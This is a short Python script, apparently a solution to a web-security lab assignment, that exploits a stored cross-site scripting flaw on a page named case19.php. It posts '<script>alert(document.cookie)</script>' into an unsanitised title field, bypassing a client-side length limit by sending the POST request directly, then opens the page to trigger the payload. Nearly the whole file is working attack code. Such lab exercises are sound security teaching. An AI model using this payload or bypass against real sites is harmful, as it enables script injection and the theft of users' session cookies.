import requests
import webbrowser

# Exploit: the "title" field on the page is not sanitized, so
# the payload is injected there. There is a client-side "protection"
# to limit "title" field to be 10 chars, but that is easily bypassed
# by modifying the DOM node, or by manually making a POST request
# without going through the browser

def main():
    payload = {'title': '<script>alert(document.cookie)</script>', 'content': 'foo'}
    r = requests.post('http://wsb.com/Assignment2/case19.php', data=payload)
    webbrowser.open('http://wsb.com/Assignment2/case19.php', 2)

if __name__ == "__main__":
    main()
